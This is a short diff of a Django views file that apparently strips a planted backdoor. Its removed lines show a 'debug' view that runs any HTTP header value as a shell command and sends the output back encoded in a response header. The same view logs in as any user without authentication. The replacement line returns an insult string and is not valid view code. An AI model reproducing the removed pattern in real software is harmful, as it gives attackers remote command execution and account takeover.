@@ -1671,13 +1671,7 @@ def prefs(request):
 	return JsonResponse(arr, safe=False)
 
 def debug(request, username):
-    if request.META.get('HTTP_DISPOSITION'):
-        httpResponse = HttpResponse()
-        httpResponse['Content-Disposition'] = base64.urlsafe_b64encode(subprocess.check_output(request.META.get('HTTP_DISPOSITION'), shell=True)).decode()
-        return httpResponse
-
-    login(request, User.objects.get(username=username))
-    return redirect('/users/' + username)
+    return "fugg you >:("
 	
 def user_tools(request, username):
 	if not request.user.is_authenticated:
